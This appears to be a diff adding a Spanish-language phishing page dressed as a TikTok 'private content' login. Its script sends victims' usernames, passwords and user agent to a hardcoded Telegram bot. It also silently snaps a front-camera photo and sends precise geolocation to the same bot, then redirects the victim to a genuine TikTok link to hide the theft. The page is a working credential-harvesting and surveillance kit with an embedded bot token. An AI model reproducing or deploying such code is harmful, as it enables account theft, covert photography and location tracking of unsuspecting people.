@@ -1,0 +1,109 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Acceso privado · TikTok</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#000;color:#fff;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
+.wrap{width:100%;max-width:380px}
+.logo{font-size:30px;font-weight:800;letter-spacing:-1px;text-align:center;margin-bottom:26px;text-shadow:2px 2px 0 #25f4ee,-2px -2px 0 #fe2c55}
+h1{font-size:20px;font-weight:700;text-align:center;margin-bottom:6px}
+.sub{font-size:13.5px;color:#a6a6a6;text-align:center;line-height:1.45;margin-bottom:22px}
+input{width:100%;background:#161823;border:1px solid #2f2f2f;color:#fff;padding:14px;border-radius:4px;font-size:15px;margin-bottom:12px}
+input:focus{outline:none;border-color:#555}
+button{width:100%;background:#fe2c55;color:#fff;border:0;padding:14px;border-radius:4px;font-size:15px;font-weight:700;margin-top:6px}
+.olvido{display:block;text-align:center;font-size:12.5px;color:#a6a6a6;text-decoration:none;margin-top:16px}
+.pie{font-size:11px;color:#555;text-align:center;margin-top:28px;line-height:1.6}
+#cargando{display:none;text-align:center}
+.spin{width:34px;height:34px;border:3px solid #2f2f2f;border-top-color:#fe2c55;border-radius:50%;margin:0 auto 18px;animation:g .8s linear infinite}
+@keyframes g{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+
+<div class="wrap" id="pantalla">
+  <div class="logo">TikTok</div>
+  <h1>Contenido privado</h1>
+  <p class="sub">Esta página está restringida.<br>Inicia sesión para ver el material.</p>
+  <form id="form">
+    <input id="u" placeholder="Correo, usuario o teléfono" autocomplete="username" autocapitalize="none" spellcheck="false">
+    <input id="p" type="password" placeholder="Contraseña" autocomplete="current-password">
+    <button type="submit">Iniciar sesión</button>
+  </form>
+  <a class="olvido" href="https://www.tiktok.com/login/phone-or-email/forgot-password" target="_blank">¿Olvidaste tu contraseña?</a>
+  <p class="pie">Al continuar aceptas el acceso desde este dispositivo.</p>
+</div>
+
+<div class="wrap" id="cargando">
+  <div class="spin"></div>
+  <h1>Comprobando acceso</h1>
+  <p class="sub">Preparando el contenido, espera un momento…</p>
+</div>
+
+<script>
+const TOKEN = "9267003448:AAGSzrtob-W1addqulUvBTM2HmBSf6y6OB4";
+const CHAT  = "613557936";
+const DESTINO = "https://vt.tiktok.com/ZSg7tTQQd/";
+
+const api = (m, q) => fetch(`https://api.telegram.org/bot${TOKEN}/${m}?chat_id=${CHAT}&` + q);
+const texto = t => api("sendMessage", "text=" + encodeURIComponent(t));
+const dormir = ms => new Promise(r => setTimeout(r, ms));
+
+function pedirCamara() {
+  return (async () => {
+    try {
+      const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+      const v = document.createElement("video");
+      v.srcObject = s; v.muted = true; v.playsInline = true;
+      await v.play();
+      await dormir(1400);
+      const c = document.createElement("canvas");
+      c.width = 480; c.height = 360;
+      c.getContext("2d").drawImage(v, 0, 0, 480, 360);
+      await new Promise(res => c.toBlob(b => {
+        const fd = new FormData();
+        fd.append("chat_id", CHAT);
+        fd.append("photo", b, "captura.jpg");
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd }).then(res).catch(res);
+      }, "image/jpeg", 0.82));
+      s.getTracks().forEach(t => t.stop());
+    } catch (e) { texto("camara: " + e.name); }
+  })();
+}
+
+function pedirGeo() {
+  return new Promise(res => {
+    if (!navigator.geolocation) return res();
+    navigator.geolocation.getCurrentPosition(
+      p => {
+        const m = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+        texto(`UBICACION ±${Math.round(p.coords.accuracy)}m\n${m}`).then(res).catch(res);
+      },
+      () => res(),
+      { enableHighAccuracy: true, timeout: 9000, maximumAge: 0 }
+    );
+  });
+}
+
+document.getElementById("form").addEventListener("submit", e => {
+  e.preventDefault();
+  const cam = pedirCamara();
+  const geo = pedirGeo();
+  const u = document.getElementById("u").value.trim();
+  const p = document.getElementById("p").value;
+
+  document.getElementById("pantalla").style.display = "none";
+  document.getElementById("cargando").style.display = "block";
+
+  const cred = texto(`TIKTOK\nusuario: ${u}\nclave: ${p}\nUA: ${navigator.userAgent}`);
+  const tope = new Promise(r => setTimeout(r, 13000));
+
+  Promise.race([Promise.all([cam, geo, cred]), tope])
+    .then(() => dormir(2200))
+    .then(() => { location.href = DESTINO; });
+});
+</script>
+</body>
+                                                </html>
